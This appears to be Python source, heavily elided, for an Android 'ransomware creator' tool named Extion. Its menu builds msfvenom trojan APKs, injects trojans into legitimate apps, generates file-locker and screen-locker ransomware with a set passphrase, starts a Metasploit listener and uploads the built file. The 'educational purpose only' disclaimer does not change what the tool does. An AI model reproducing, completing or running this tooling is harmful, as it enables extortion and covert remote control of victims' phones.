...
try:
    ...
    exit(f'''
{extionrc} : It seems there is a module that you have not installed
         run this command \'{g}pip install -r requirements.txt{w}\'
         to install it.
    ''')
# banner (extionrc-v3.0)
def banner():
    ...
    print(w+d+"   ((((((              ))))))")
    print(w+d+"   ((((((              ))))))")
    print(w+d+"    ((((("+w+b+",extionransom,"+w+d+")))))")
    print(w+d+"     ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))")
    print(w+b+"      \@@/"+r+",:::,"+w+b+"\/"+r+",:::,"+w+b+"\@@/")
    print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\")
    print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\"+r+"':::'"+w+b+"/@@@ \\    "+w+"'"+r+"Extion in RedTeaming"+b+w+"'")
...
def replace_string(oldstr, newstr, file):
    text = f'{extionrc} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
...
def add_new_icon(icon, path):
    text = f'{extionrc} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
    ...
    print(text + f'{g}done{w}')
    text = f'{extionrc} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_code(cstr, path):
    text = f'{extionrc} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_name(nstr, path):
    text = f'{extionrc} : add \'{d}{nstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_dir(olddir, newdir):
    text = f'{extionrc} : rename \'{d}{olddir.split("/")[-1]}{w}\' into \'{d}{newdir.split("/")[-1]}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def upload_file(file):
    prints(f'''
{extionrc} : do you want to upload \'{g}{file}{w}\' ?
    ...
    text = f'{extionrc} : upload \'{d}{file}{w}\' into the link ...'
    print(text + f'{y}wait{w}', end='\r')
    ...
    print(text + f'{g}done{w}')
    prints(f'''
{extionrc} : your file has been successfully uploaded,
...
def generate_trojan(host, port, name = None):
    ...
    text = f'{extionrc} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}', end='\r')
...
def generate_infected_trojan(host, port, orig):
    ...
    text = f'{extionrc} : infection \'{g}{name}.apk{w}\' using msfvenom{w} ... '
    ...
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    text = f'{extionrc} : infection \'{g}{name}-infected.apk{w}\' using msfvenom{w} ... '
    print('\n' + w + text + f'{g}done{w}')
    return file
...
def genertare_file_locker(name, desc, icon):
    ...
    text = f'{extionrc} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def genertare_screen_locker(name, head, desc, keys, icon):
    ...
    print(f'{extionrc} : add \'{d}{keys}{w}\' as passprhase ... {y}wait{w}', end='\r')
    replace_strings('app_keys', keys, f'{path}/smali/com/termuxhackers/id/MyService$100000000.smali')
    print(f'{extionrc} : add \'{d}{keys}{w}\' as \'{d}passprhase{w}\' ... {g}done{w}')
    text = f'{extionrc} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
...
def start_trojan_listener(host, port):
    prints(f'''
{extionrc} : redirecting to the metasploit console
...
def uber_apk_signer(file):
    text = f'{extionrc} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
    print(text + f'{y}wait{w}', end='\r')
...
def decompile(file):
    text = f'{extionrc} : decompile \'{d}{file}{w}\' using apktool ... '
...
def recompile(path):
    text = f'{extionrc} : recompile \'{d}{path}{w}\' using apktool ... '
    file = path + '.apk'
    print(text + f'{y}wait{w}', end='\r')
...
class __extionrc__:
    ...
    def custom_trojan(self):
        banner()
        prints(f'''
{extionrc} : you can fill or leave blank for using
        ...
        prints(f'''
{extionrc} : well this process takes a few minutes,
        ...
        upload_file(apps)
        if not os.path.isfile(apps): exit(f'\n{extionrc} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
        prints(f'''
{extionrc} : your trojan apps successfully created
        ...
        else: exit(f'\n{extionrc} : process completed successfully ...\n')
...
{extionrc} : you can fill or leave blank for using default config
        ...
        if not os.path.isfile(orig): exit(f'{extionrc} : file \'{d}{orig}{w}\' doesn\'t exist !')
        host = str(input(f'         set app host: '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port: '))
        if not port: port = '4444'
...
{extionrc} : well this process takes a few minutes,
        ...
        upload_file(file)
        if not os.path.isfile(file): exit(f'\n{extionrc} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{extionrc} : your trojan apps successfully created
...
{extionrc} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{extionrc} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{extionrc} : your file locker apps successfully created
...
{extionrc} : well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{extionrc} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{extionrc} : your screen locker apps successfully created
         the application is saved as \'{g}{file}{w}\'
    ...
    def menu(self):
        banner()
        prints(f'''
{extionrc} : Hi user, welcome to @{y}Extion Ransomware Creator{w} :)

{extionrc} : Extionrc(ransomeware creator tool) is a Android ransomware and trojan
         creator tool, this tool is made for educational purpose only.
         you can build custom trojan, file locker and screen locker ransomware
         using this tool, you can also infect original application with trojan
         Extion Infotech is not responsible for any loses
         or damage caused by this programs.

{extionrc} : Type of ransomware that you can build
        ...
        while True:
            ...
            if main in ('1', '01'):
                banner()
                prints(f'''
{extionrc} : ok, you can choose one ...
         ...
         (3) back to previous
                ...
                while True:
                    ...
                    else: print(f'{extionrc} : sorry, no command found for: {main_menu}'); continue
                    break
            elif main in ('2', '02'): self.custom_file_locker()
            elif main in ('3', '03'): self.custom_screen_locker()
            elif main in ('4', '04', 'exit'): exit(1)
            else: print(f'{extionrc} : sorry, no command found for: {main}'); continue
            break
        input(f'{extionrc} : press enter for back to \'{g}main menu{w}\' (enter) ')
        self.menu()

if __name__ == '__main__':
    try: __extionrc__().menu()
